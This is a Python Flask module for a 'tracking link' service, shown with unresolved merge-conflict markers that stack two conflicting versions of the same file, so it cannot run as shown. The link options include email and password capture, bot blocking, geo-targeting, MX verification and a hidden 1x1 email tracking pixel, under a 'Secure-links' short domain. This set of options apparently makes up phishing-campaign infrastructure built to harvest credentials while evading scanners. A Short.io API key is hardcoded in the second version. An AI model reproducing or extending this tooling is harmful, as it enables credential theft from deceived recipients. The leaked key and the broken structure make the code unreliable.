<<<<<<< HEAD
from flask import Blueprint, request, jsonify, session
from src.models.link import Link
from src.models.user import User, db
from src.models.campaign import Campaign
from functools import wraps
import json

links_bp = Blueprint('links', __name__)

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return jsonify({'error': 'Authentication required'}), 401
        return f(*args, **kwargs)
    return decorated_function

@links_bp.route('/links', methods=['GET'])
@login_required
def get_links():
    """Get all links for current user"""
    try:
        user_id = session.get('user_id')
        user = User.query.get(user_id)

        page = request.args.get('page', 1, type=int)
        per_page = request.args.get('per_page', 20, type=int)
        campaign_id = request.args.get('campaign_id', type=int)

        query = Link.query.filter_by(user_id=user_id)

        if campaign_id:
            query = query.filter_by(campaign_id=campaign_id)

        pagination = query.order_by(Link.created_at.desc()).paginate(
            page=page, per_page=per_page, error_out=False
        )

        links = [link.to_dict(base_url=request.host_url.rstrip('/')) for link in pagination.items]

        return jsonify({
            'links': links,
            'total': pagination.total,
            'pages': pagination.pages,
            'current_page': page
        }), 200

    except Exception as e:
        return jsonify({'error': str(e)}), 500

@links_bp.route('/links', methods=['POST'])
@login_required
def create_link():
    """Create new tracking link"""
    try:
        user_id = session.get('user_id')
        user = User.query.get(user_id)

        if not user.can_create_link():
            return jsonify({'error': 'Daily link limit reached'}), 403

        data = request.get_json()
        target_url = data.get('target_url')
        campaign_name = data.get('campaign_name', 'Untitled Campaign')
        campaign_id = data.get('campaign_id')

        if not target_url:
            return jsonify({'error': 'Target URL required'}), 400

        link = Link(
            user_id=user_id,
            target_url=target_url,
            campaign_name=campaign_name,
            capture_email=data.get('capture_email', False),
            capture_password=data.get('capture_password', False),
            bot_blocking_enabled=data.get('bot_blocking_enabled', False),
            geo_targeting_enabled=data.get('geo_targeting_enabled', False),
            geo_targeting_type=data.get('geo_targeting_type', 'allow'),
            rate_limiting_enabled=data.get('rate_limiting_enabled', False),
            dynamic_signature_enabled=data.get('dynamic_signature_enabled', False),
            mx_verification_enabled=data.get('mx_verification_enabled', False),
            preview_template_url=data.get('preview_template_url'),
            allowed_countries=json.dumps(data.get('allowed_countries', [])),
            blocked_countries=json.dumps(data.get('blocked_countries', [])),
            allowed_regions=json.dumps(data.get('allowed_regions', [])),
            blocked_regions=json.dumps(data.get('blocked_regions', [])),
            allowed_cities=json.dumps(data.get('allowed_cities', [])),
            blocked_cities=json.dumps(data.get('blocked_cities', []))
        )

        db.session.add(link)
        user.increment_link_usage()
        db.session.commit()

        return jsonify(link.to_dict(base_url=request.host_url.rstrip('/'))), 201

    except Exception as e:
        db.session.rollback()
        return jsonify({'error': str(e)}), 500

@links_bp.route('/links/<int:link_id>', methods=['GET'])
@login_required
def get_link(link_id):
    """Get specific link"""
    try:
        user_id = session.get('user_id')
        link = Link.query.filter_by(id=link_id, user_id=user_id).first()

        if not link:
            return jsonify({'error': 'Link not found'}), 404

        return jsonify(link.to_dict(base_url=request.host_url.rstrip('/'))), 200

    except Exception as e:
        return jsonify({'error': str(e)}), 500

@links_bp.route('/links/<int:link_id>', methods=['PATCH'])
@login_required
def update_link(link_id):
    """Update link"""
    try:
        user_id = session.get('user_id')
        link = Link.query.filter_by(id=link_id, user_id=user_id).first()

        if not link:
            return jsonify({'error': 'Link not found'}), 404

        data = request.get_json()

        if 'target_url' in data:
            link.target_url = data['target_url']
        if 'campaign_name' in data:
            link.campaign_name = data['campaign_name']
        if 'status' in data:
            link.status = data['status']
        if 'capture_email' in data:
            link.capture_email = data['capture_email']
        if 'bot_blocking_enabled' in data:
            link.bot_blocking_enabled = data['bot_blocking_enabled']

        db.session.commit()

        return jsonify(link.to_dict(base_url=request.host_url.rstrip('/'))), 200

    except Exception as e:
        db.session.rollback()
        return jsonify({'error': str(e)}), 500

@links_bp.route('/links/<int:link_id>', methods=['DELETE'])
@login_required
def delete_link(link_id):
    """Delete link"""
    try:
        user_id = session.get('user_id')
        link = Link.query.filter_by(id=link_id, user_id=user_id).first()

        if not link:
            return jsonify({'error': 'Link not found'}), 404

        db.session.delete(link)
        db.session.commit()

        return jsonify({'message': 'Link deleted successfully'}), 200

    except Exception as e:
        db.session.rollback()
        return jsonify({'error': str(e)}), 500
=======

from flask import Blueprint, request, jsonify, session
from src.models.user import db, User
from src.models.link import Link
from src.models.tracking_event import TrackingEvent
import string
import random
import json
import requests
import os

links_bp = Blueprint("links", __name__)

def require_auth():
    if "user_id" not in session:
        return None
    return User.query.get(session["user_id"])

def generate_short_code(length=8):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def sanitize_input(text):
    if not text:
        return ""
    return text.strip()

@links_bp.route("/links/create", methods=["POST"])
def create_link():
    user = require_auth()
    if not user:
        return jsonify({"success": False, "error": "Authentication required"}), 401
    
    try:
        data = request.get_json()
        
        # Validate required fields
        if not data.get("originalUrl"):
            return jsonify({"error": "Original URL is required"}), 400
        
        original_url = sanitize_input(data.get("originalUrl"))
        title = sanitize_input(data.get("title", ""))
        campaign = sanitize_input(data.get("campaign", ""))
        domain_type = data.get("domain", "vercel")
        custom_domain = sanitize_input(data.get("customDomain", ""))
        expiry_date = data.get("expiryDate")
        password = data.get("password", "")
        description = sanitize_input(data.get("description", ""))
        
        short_url = ""
        if domain_type == "vercel":
            # Generate short code for Vercel domain
            short_code = generate_short_code()
            while Link.query.filter_by(short_code=short_code).first():
                short_code = generate_short_code()
            scheme = request.headers.get("X-Forwarded-Proto", request.scheme)
            base_url = f"{scheme}://{request.host}"
            short_url = f"{base_url}/s/{short_code}"
        elif domain_type == "shortio":
            # Use Short.io API to create a short link
            shortio_api_key = "sk_DbGGlUHPN7Z9VotL"  # Provided API key
            if not shortio_api_key:
                return jsonify({"success": False, "error": "Short.io API key not configured"}), 500
            
            shortio_domain = "Secure-links.short.gy"  # Provided domain
            if not shortio_domain:
                return jsonify({"success": False, "error": "Short.io domain not configured"}), 500

            headers = {
                "Authorization": shortio_api_key,
                "Content-Type": "application/json"
            }
            payload = {
                "originalURL": original_url,
                "domain": shortio_domain
            }
            
            response = requests.post("https://api.short.io/links", headers=headers, json=payload)
            response.raise_for_status() # Raise an exception for HTTP errors
            
            short_link_data = response.json()
            short_url = short_link_data.get("shortURL")
            short_code = short_link_data.get("path") # Short.io returns path as short code
            
            if not short_url:
                return jsonify({"success": False, "error": "Failed to get short URL from Short.io"}), 500
        elif domain_type == "custom" and custom_domain:
            # Generate short code for custom domain
            short_code = generate_short_code()
            while Link.query.filter_by(short_code=short_code).first():
                short_code = generate_short_code()
            short_url = f"https://{custom_domain}/{short_code}"
        else:
            return jsonify({"success": False, "error": "Invalid domain type or custom domain not provided"}), 400

        # Create new link
        new_link = Link(
            user_id=user.id,
            target_url=original_url,
            short_code=short_code,
            campaign_name=campaign if campaign else "Untitled Campaign"
        )
        
        # Set expiry date if provided
        if expiry_date:
            from datetime import datetime
            new_link.expiry_date = datetime.fromisoformat(expiry_date)
        
        db.session.add(new_link)
        db.session.commit()
        
        # Return the created link
        link_data = new_link.to_dict(base_url=request.host_url) # Use request.host_url for base_url
        link_data.update({
            "shortUrl": short_url,
            "total_clicks": 0,
            "real_visitors": 0,
            "blocked_attempts": 0
        })
        
        return jsonify({
            "success": True,
            "link": link_data
        })
        
    except requests.exceptions.RequestException as e:
        db.session.rollback()
        print(f"Error creating link with Short.io: {e}")
        return jsonify({"error": f"Failed to create link with Short.io: {e}"}), 500
    except Exception as e:
        db.session.rollback()
        print(f"Error creating link: {e}")
        return jsonify({"error": "Failed to create link"}), 500
@links_bp.route("/links", methods=["GET", "POST", "PUT", "DELETE"])
def links():
    user = require_auth()
    if not user:
        return jsonify({"success": False, "error": "Authentication required"}), 401
    
    scheme = request.headers.get("X-Forwarded-Proto", request.scheme)
    base_url = f"{scheme}://{request.host}"
    
    if request.method == "GET":
        # Get all links for the current user
        links = Link.query.filter_by(user_id=user.id).order_by(Link.created_at.desc()).all()
        
        links_data = []
        for link in links:
            link_dict = link.to_dict(base_url=base_url)
            # Get analytics data
            total_clicks = TrackingEvent.query.filter_by(link_id=link.id).count()
            real_visitors = TrackingEvent.query.filter_by(link_id=link.id, is_bot=False).count()
            blocked_attempts = TrackingEvent.query.filter_by(link_id=link.id, status="blocked").count()

            link_dict.update({
                "total_clicks": total_clicks,
                "real_visitors": real_visitors,
                "blocked_attempts": blocked_attempts
            })
            
            # Add tracking URLs with ID parameters
            link_dict["tracking_url"] = f"{base_url}/t/{link.short_code}?id={{id}}"
            link_dict["pixel_url"] = f"{base_url}/p/{link.short_code}?email={{email}}&id={{id}}"
            link_dict["email_code"] = f"<img src=\"{base_url}/p/{link.short_code}?email={{email}}&id={{id}}\" width=\"1\" height=\"1\" style=\"display:none;\" />"
            links_data.append(link_dict)
        
        return jsonify({"links": links_data})
    
    elif request.method == "POST":
        # Create a new tracking link
        data = request.get_json()
        if not data:
            return jsonify({"success": False, "error": "No data provided"}), 400
        
        target_url = sanitize_input(data.get("target_url", ""))
        campaign_name = sanitize_input(data.get("campaign_name", "Untitled Campaign"))
        preview_template_url = sanitize_input(data.get("preview_template_url", ""))
        
        # Security features
        capture_email = data.get("capture_email", False)
        capture_password = data.get("capture_password", False)
        bot_blocking_enabled = data.get("bot_blocking_enabled", True)
        rate_limiting_enabled = data.get("rate_limiting_enabled", False)
        dynamic_signature_enabled = data.get("dynamic_signature_enabled", False)
        mx_verification_enabled = data.get("mx_verification_enabled", False)
        
        # Geo targeting
        geo_targeting_enabled = data.get("geo_targeting_enabled", False)
        geo_targeting_type = data.get("geo_targeting_type", "allow")  # allow or block
        allowed_countries = data.get("allowed_countries", [])
        blocked_countries = data.get("blocked_countries", [])
        allowed_regions = data.get("allowed_regions", [])
        blocked_regions = data.get("blocked_regions", [])
        allowed_cities = data.get("allowed_cities", [])
        blocked_cities = data.get("blocked_cities", [])
        
        if not target_url:
            return jsonify({"success": False, "error": "Target URL is required"}), 400
        
        if not target_url.startswith(("http://", "https://")):
            return jsonify({"success": False, "error": "Invalid target URL"}), 400
        
        # Generate unique short code
        while True:
            short_code = generate_short_code()
            existing = Link.query.filter_by(short_code=short_code).first()
            if not existing:
                break
        
        try:
            link = Link(
                user_id=user.id,
                short_code=short_code,
                target_url=target_url,
                campaign_name=campaign_name,
                capture_email=capture_email,
                capture_password=capture_password,
                bot_blocking_enabled=bot_blocking_enabled,
                geo_targeting_enabled=geo_targeting_enabled,
                geo_targeting_type=geo_targeting_type,
                allowed_countries=json.dumps(allowed_countries) if allowed_countries else None,
                blocked_countries=json.dumps(blocked_countries) if blocked_countries else None,
                allowed_regions=json.dumps(allowed_regions) if allowed_regions else None,
                blocked_regions=json.dumps(blocked_regions) if blocked_regions else None,
                allowed_cities=json.dumps(allowed_cities) if allowed_cities else None,
                blocked_cities=json.dumps(blocked_cities) if blocked_cities else None,
                rate_limiting_enabled=rate_limiting_enabled,
                dynamic_signature_enabled=dynamic_signature_enabled,
                mx_verification_enabled=mx_verification_enabled,
                preview_template_url=preview_template_url
            )
            
            db.session.add(link)
            db.session.commit()
            
            return jsonify({
                "success": True,
                "message": "Tracking link created successfully",
                "link": {
                    "id": link.id,
                    "short_code": short_code,
                    "tracking_url": f"{base_url}/t/{short_code}?id={{id}}",
                    "pixel_url": f"{base_url}/p/{short_code}?email={{email}}&id={{id}}",
                    "email_code": f"<img src=\"{base_url}/p/{short_code}?email={{email}}&id={{id}}\" width=\"1\" height=\"1\" style=\"display:none;\" />",
                    "target_url": target_url
                }
            })
        except Exception as e:
            db.session.rollback()
            return jsonify({"success": False, "error": "Failed to create tracking link"}), 500
    
    elif request.method == "PUT":
        # Update an existing tracking link
        data = request.get_json()
        if not data:
            return jsonify({"success": False, "error": "No data provided"}), 400
        
        link_id = data.get("id")
        if not link_id:
            return jsonify({"success": False, "error": "Link ID is required"}), 400
        
        link = Link.query.filter_by(id=link_id, user_id=user.id).first()
        if not link:
            return jsonify({"success": False, "error": "Link not found or access denied"}), 404
        
        target_url = sanitize_input(data.get("target_url", ""))
        if not target_url:
            return jsonify({"success": False, "error": "Target URL is required"}), 400
        
        if not target_url.startswith(("http://", "https://")):
            return jsonify({"success": False, "error": "Invalid target URL"}), 400
        
        try:
            link.target_url = target_url
            link.campaign_name = sanitize_input(data.get("campaign_name", link.campaign_name))
            link.capture_email = data.get("capture_email", False)
            link.capture_password = data.get("capture_password", False)
            link.bot_blocking_enabled = data.get("bot_blocking_enabled", True)
            link.geo_targeting_enabled = data.get("geo_targeting_enabled", False)
            link.geo_targeting_type = data.get("geo_targeting_type", "allow")
            link.allowed_countries = json.dumps(data.get("allowed_countries")) if data.get("allowed_countries") else None
            link.blocked_countries = json.dumps(data.get("blocked_countries")) if data.get("blocked_countries") else None
            link.allowed_regions = json.dumps(data.get("allowed_regions")) if data.get("allowed_regions") else None
            link.blocked_regions = json.dumps(data.get("blocked_regions")) if data.get("blocked_regions") else None
            link.allowed_cities = json.dumps(data.get("allowed_cities")) if data.get("allowed_cities") else None
            link.blocked_cities = json.dumps(data.get("blocked_cities")) if data.get("blocked_cities") else None
            link.rate_limiting_enabled = data.get("rate_limiting_enabled", False)
            link.dynamic_signature_enabled = data.get("dynamic_signature_enabled", False)
            link.mx_verification_enabled = data.get("mx_verification_enabled", False)
            link.preview_template_url = sanitize_input(data.get("preview_template_url", ""))
            
            db.session.commit()
            
            return jsonify({
                "success": True,
                "message": "Tracking link updated successfully"
            })
        except Exception as e:
            db.session.rollback()
            return jsonify({"success": False, "error": "Failed to update tracking link"}), 500
    
    elif request.method == "DELETE":
        # Delete a tracking link
        data = request.get_json()
        if not data:
            return jsonify({"success": False, "error": "No data provided"}), 400
        
        link_id = data.get("id")
        if not link_id:
            return jsonify({"success": False, "error": "Link ID is required"}), 400
        
        link = Link.query.filter_by(id=link_id, user_id=user.id).first()
        if not link:
            return jsonify({"success": False, "error": "Link not found or access denied"}), 404
        
        try:
            db.session.delete(link)
            db.session.commit()
            
            return jsonify({
                "success": True,
                "message": "Tracking link deleted successfully"
            })
        except Exception as e:
            db.session.rollback()
            return jsonify({"success": False, "error": "Failed to delete tracking link"}), 500


@links_bp.route("/links/<int:link_id>/regenerate", methods=["POST"])
def regenerate_link(link_id):
    user = require_auth()
    if not user:
        return jsonify({"success": False, "error": "Authentication required"}), 401
    
    link = Link.query.filter_by(id=link_id, user_id=user.id).first()
    if not link:
        return jsonify({"success": False, "error": "Link not found or access denied"}), 404
    
    scheme = request.headers.get("X-Forwarded-Proto", request.scheme)
    base_url = f"{scheme}://{request.host}"
    
    # Generate new unique short code
    while True:
        new_short_code = generate_short_code()
        existing = Link.query.filter_by(short_code=new_short_code).first()
        if not existing:
            break
    
    try:
        old_short_code = link.short_code
        link.short_code = new_short_code
        db.session.commit()
        
        return jsonify({
            "success": True,
            "message": "Tracking link regenerated successfully",
            "old_short_code": old_short_code,
            "new_short_code": new_short_code,
            "tracking_url": f"{base_url}/t/{new_short_code}?id={{id}}",
            "pixel_url": f"{base_url}/p/{new_short_code}?email={{email}}&id={{id}}",
            "email_code": f"<img src=\"{base_url}/p/{new_short_code}?email={{email}}&id={{id}}\" width=\"1\" height=\"1\" style=\"display:none;\" />"
        })
    except Exception as e:
        db.session.rollback()
        return jsonify({"success": False, "error": "Failed to regenerate tracking link"}), 500

@links_bp.route("/links/stats", methods=["GET"])
def get_links_stats():
    user = require_auth()
    if not user:
        return jsonify({"success": False, "error": "Authentication required"}), 401
    
    try:
        # Get user's links
        user_links = Link.query.filter_by(user_id=user.id).all()
        link_ids = [link.id for link in user_links]
        
        if not link_ids:
            return jsonify({
                "totalLinks": 0,
                "totalClicks": 0,
                "activeLinks": 0,
                "avgCTR": 0
            })
        
        # Calculate stats
        total_links = len(user_links)
        active_links = len([link for link in user_links if link.is_active])
        
        # Get click statistics
        total_clicks = TrackingEvent.query.filter(TrackingEvent.link_id.in_(link_ids)).count()
        
        # Calculate average CTR (simplified calculation)
        avg_ctr = (total_clicks / total_links) if total_links > 0 else 0
        
        return jsonify({
            "totalLinks": total_links,
            "totalClicks": total_clicks,
            "activeLinks": active_links,
            "avgCTR": round(avg_ctr, 2)
        })
        
    except Exception as e:
        print(f"Error fetching link stats: {e}")
        return jsonify({
            "totalLinks": 0,
            "totalClicks": 0,
            "activeLinks": 0,
            "avgCTR": 0
        }), 500

@links_bp.route("/links/<int:link_id>/toggle-status", methods=["POST"])
def toggle_link_status(link_id):
    user = require_auth()
    if not user:
        return jsonify({"success": False, "error": "Authentication required"}), 401
    
    link = Link.query.filter_by(id=link_id, user_id=user.id).first()
    if not link:
        return jsonify({"success": False, "error": "Link not found or access denied"}), 404
    
    try:
        # Toggle between active and paused
        link.status = "paused" if link.status == "active" else "active"
        db.session.commit()
        
        return jsonify({
            "success": True,
            "message": f"Link {link.status}",
            "status": link.status
        })
    except Exception as e:
        db.session.rollback()
        return jsonify({"success": False, "error": "Failed to toggle link status"}), 500


@links_bp.route("/links/<int:link_id>", methods=["DELETE"])
def delete_link_by_id(link_id):
    """Delete a tracking link by ID"""
    user = require_auth()
    if not user:
        return jsonify({"success": False, "error": "Authentication required"}), 401
    
    try:
        link = Link.query.filter_by(id=link_id, user_id=user.id).first()
        if not link:
            return jsonify({"success": False, "error": "Link not found or access denied"}), 404
        
        # Delete associated tracking events first
        TrackingEvent.query.filter_by(link_id=link.id).delete()
        
        # Delete the link
        db.session.delete(link)
        db.session.commit()
        
        return jsonify({
            "success": True,
            "message": "Tracking link deleted successfully"
        })
        
    except Exception as e:
        db.session.rollback()
        print(f"Error deleting link: {e}")
        return jsonify({"success": False, "error": "Failed to delete tracking link"}), 500

>>>>>>> 00392b0 (Initial commit of unified Brain Link Tracker project with integrated admin panel fixes)
